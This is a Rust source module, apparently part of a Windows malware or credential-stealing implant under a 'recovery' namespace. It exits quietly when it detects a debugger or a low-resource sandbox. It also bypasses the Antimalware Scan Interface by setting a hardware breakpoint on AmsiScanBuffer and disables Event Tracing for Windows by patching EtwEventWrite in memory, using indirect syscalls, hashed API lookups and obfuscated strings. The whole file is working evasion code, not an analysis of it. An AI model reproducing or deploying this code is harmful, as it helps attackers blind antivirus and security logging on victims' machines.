use crate::recovery::helpers::obfuscation::{deobf, deobf_w};
use crate::recovery::settings::RecoveryControl;
use tracing::{debug, info, warn};
use crate::recovery::helpers::dynamic_api::{get_module_base, get_proc_address, load_library, djb2_hash, KERNEL32_HASH};
use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows_sys::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX, GetSystemInfo, SYSTEM_INFO};
use windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;

#[cfg(feature = "evasion")]
use crate::recovery::helpers::hw_breakpoints::enable_hw_breakpoint;
use crate::recovery::helpers::syscalls::{SyscallManager, indirect_syscall_5};

pub fn apply_evasion_techniques() {
    if !RecoveryControl::global().evasion_enabled() {
        debug!("evasion techniques are disabled");
        return;
    }

    if !is_environment_safe() {
        warn!("environment unsafe (sandbox/debugger detected); terminating");
        std::process::exit(0);
    }

    info!("applying evasion and stealth techniques");

    let syscall_manager = match SyscallManager::new() {
        Ok(m) => Some(m),
        Err(e) => {
            debug!(error = ?e, "failed to initialize syscall manager");
            None
        }
    };

    if let Err(err) = bypass_amsi() {
        debug!(error = ?err, "AMSI bypass failed");
    } else {
        info!("AMSI bypass applied successfully via HW BP");
    }

    if let Err(err) = patch_etw(syscall_manager.as_ref()) {
        debug!(error = ?err, "ETW bypass failed");
    } else {
        info!("ETW bypass applied successfully");
    }
}

fn is_environment_safe() -> bool {
    unsafe {
        // Check for basic debugger presence
        if IsDebuggerPresent() != 0 {
            debug!("IsDebuggerPresent detected a debugger");
            return false;
        }

        // Check for low RAM (typical of sandboxes)
        let mut mem_status: MEMORYSTATUSEX = std::mem::zeroed();
        mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        if GlobalMemoryStatusEx(&mut mem_status) != 0 {
            // Check if RAM is less than 2GB (2 * 1024 * 1024 * 1024)
            if mem_status.ullTotalPhys < 2_147_483_648 {
                debug!("Low memory detected: {} bytes", mem_status.ullTotalPhys);
                return false;
            }
        }

        // Check for low CPU count (typical of sandboxes)
        let mut sys_info: SYSTEM_INFO = std::mem::zeroed();
        GetSystemInfo(&mut sys_info);
        if sys_info.dwNumberOfProcessors < 2 {
            debug!("Low CPU count detected: {}", sys_info.dwNumberOfProcessors);
            return false;
        }
    }
    true
}

fn bypass_amsi() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        // "amsi.dll"
        let amsi_name = deobf(&[0xBF, 0x45, 0xB8, 0x1C, 0x6E, 0x0E, 0x1F, 0x70]);
        let h_amsi = load_library(&amsi_name);
        if h_amsi.is_null() {
            return Err("failed to load amsi.dll".into());
        }

        // "AmsiScanBuffer"
        let func_hash = djb2_hash("AmsiScanBuffer");
        let p_address = get_proc_address(h_amsi, func_hash);

        if p_address.is_null() {
            return Err("failed to find AmsiScanBuffer address".into());
        }

        if !enable_hw_breakpoint(p_address as usize) {
            return Err("failed to set hardware breakpoint for AMSI".into());
        }

        Ok(())
    }
}

fn patch_etw(syscalls: Option<&SyscallManager>) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        // "ntdll.dll"
        let _ntdll_name = deobf_w(&[0xB0, 0x5B, 0x77, 0xE3, 0x42, 0xD4, 0x19, 0x70, 0xA5]);
        let h_ntdll = load_library("ntdll.dll"); // ntdll is already loaded, but load_library handles it
        if h_ntdll.is_null() {
            return Err("failed to load ntdll.dll".into());
        }

        // "EtwEventWrite"
        let func_hash = djb2_hash("EtwEventWrite");
        let p_address = get_proc_address(h_ntdll, func_hash);

        if p_address.is_null() {
            return Err("failed to find EtwEventWrite address".into());
        }

        let patch: [u8; 3] = [0x33, 0xC0, 0xC3];

        apply_patch(p_address, &patch, syscalls)
    }
}

fn apply_patch(
    p_address: *mut std::ffi::c_void,
    patch: &[u8],
    syscalls: Option<&SyscallManager>,
) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let mut old_protect: u32 = 0;
        let mut size = patch.len();
        let mut addr = p_address;

        if let Some(mgr) = syscalls {
            let status = indirect_syscall_5(
                mgr.nt_protect_virtual_memory_ssn,
                mgr.syscall_gadget,
                -1, // Current process
                &mut addr as *mut _ as isize,
                &mut size as *mut _ as isize,
                PAGE_EXECUTE_READWRITE as isize,
                &mut old_protect as *mut _ as isize,
            );
            if status != 0 {
                return Err(
                    format!("NtProtectVirtualMemory failed with status 0x{:X}", status).into(),
                );
            }
        } else {
            let kernel32 = get_module_base(KERNEL32_HASH);
            let virtual_protect_ptr = get_proc_address(kernel32, djb2_hash("VirtualProtect"));
            if virtual_protect_ptr.is_null() {
                return Err("failed to find VirtualProtect".into());
            }
            type FnVirtualProtect = unsafe extern "system" fn(
                lp_address: *const std::ffi::c_void,
                dw_size: usize,
                fl_new_protect: u32,
                lpfl_old_protect: *mut u32,
            ) -> i32;
            let virtual_protect: FnVirtualProtect = std::mem::transmute(virtual_protect_ptr);

            if virtual_protect(p_address, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
                return Err("VirtualProtect failed".into());
            }
        }

        std::ptr::copy_nonoverlapping(patch.as_ptr(), p_address as *mut u8, patch.len());

        let mut temp: u32 = 0;
        if let Some(mgr) = syscalls {
            let _ = indirect_syscall_5(
                mgr.nt_protect_virtual_memory_ssn,
                mgr.syscall_gadget,
                -1,
                &mut addr as *mut _ as isize,
                &mut size as *mut _ as isize,
                old_protect as isize,
                &mut temp as *mut _ as isize,
            );
        } else {
            let kernel32 = get_module_base(KERNEL32_HASH);
            let virtual_protect_ptr = get_proc_address(kernel32, djb2_hash("VirtualProtect"));
            type FnVirtualProtect = unsafe extern "system" fn(
                lp_address: *const std::ffi::c_void,
                dw_size: usize,
                fl_new_protect: u32,
                lpfl_old_protect: *mut u32,
            ) -> i32;
            let virtual_protect: FnVirtualProtect = std::mem::transmute(virtual_protect_ptr);
            virtual_protect(p_address, patch.len(), old_protect, &mut temp);
        }

        Ok(())
    }
}
